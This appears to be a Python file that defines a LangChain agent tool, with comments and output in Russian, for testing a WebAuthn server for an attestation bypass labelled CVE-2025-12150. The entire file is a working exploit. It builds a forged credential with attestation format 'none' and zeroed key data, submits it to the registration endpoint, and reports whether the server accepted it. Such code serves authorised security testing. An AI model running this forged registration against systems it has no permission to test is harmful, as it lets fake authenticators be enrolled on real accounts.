from langchain.tools import tool
import requests
import json
import base64
import hashlib
import struct
import cbor2


def _make_attestation(rp_id: str, cred_id: bytes) -> bytes:
    auth_data = (
        hashlib.sha256(rp_id.encode()).digest()
        + b"\x41"
        + struct.pack(">I", 0)
        + b"\x00" * 16
        + struct.pack(">H", len(cred_id))
        + cred_id
        + cbor2.dumps({1: 2, 3: -7, -1: 1, -2: b"\x00"*32, -3: b"\x00"*32})
    )
    return cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})


@tool
def check_webauthn_attestation(base_url: str, email: str = "test@example.com"):
    """
    Проверяет WebAuthn-эндпоинт на обход политики attestation (CVE-2025-12150).
    """
    url_begin = f"{base_url}/register/begin"
    url_complete = f"{base_url}/register/complete"

    try:
        begin_resp = requests.post(url_begin, json={"email": email}, timeout=10)
        if begin_resp.status_code != 200:
            return json.dumps({"verdict": "ОШИБКА", "detail": f"begin: {begin_resp.status_code}"}, ensure_ascii=False)

        options = begin_resp.json()
        challenge = options.get("challenge")
        rp_id = options.get("rp", {}).get("id", "localhost")
        cred_id = b"fake_credential_id_1234567890"

        client_data = {
            "type": "webauthn.create",
            "challenge": challenge,
            "origin": "http://localhost:5001",
        }

        fake_attestation = {
            "id": base64.urlsafe_b64encode(cred_id).decode().rstrip("="),
            "rawId": base64.urlsafe_b64encode(cred_id).decode().rstrip("="),
            "response": {
                "clientDataJSON": base64.urlsafe_b64encode(json.dumps(client_data).encode()).decode().rstrip("="),
                "attestationObject": base64.urlsafe_b64encode(_make_attestation(rp_id, cred_id)).decode().rstrip("="),
                "transports": ["internal"],
            },
            "type": "public-key",
        }
        fake_attestation["email"] = email

        complete_resp = requests.post(
            url_complete,
            data=json.dumps(fake_attestation),
            headers={"Content-Type": "application/json"},
            timeout=10,
        )

        try:
            complete_body = complete_resp.json()
        except Exception:
            complete_body = {"raw": complete_resp.text[:500]}

        is_vulnerable = complete_resp.status_code == 200 and complete_body.get("verified") is True

        if is_vulnerable:
            evidence = ["Сервер принял attestation с fmt: none, хотя требовал direct — CVE-2025-12150"]
        elif "origin" in complete_resp.text.lower():
            evidence = ["Отклонено на этапе проверки origin — тест не дошёл до attestation"]
        elif "attestation" in complete_resp.text.lower():
            evidence = ["Сервер проверил attestation и отклонил подделку"]
        else:
            evidence = [f"Ответ сервера: {complete_resp.status_code}"]

        return json.dumps({
            "verdict": "УЯЗВИМ (Attestation Bypass)" if is_vulnerable else "ЗАЩИЩЁН",
            "cve": "CVE-2025-12150",
            "status_code": complete_resp.status_code,
            "evidence": evidence,
            "server_response": complete_body,
        }, ensure_ascii=False, indent=2)

    except requests.exceptions.Timeout:
        return json.dumps({"verdict": "ОШИБКА", "detail": "Таймаут"}, ensure_ascii=False)
    except Exception as e:
        return json.dumps({"verdict": "ОШИБКА", "detail": str(e)}, ensure_ascii=False)
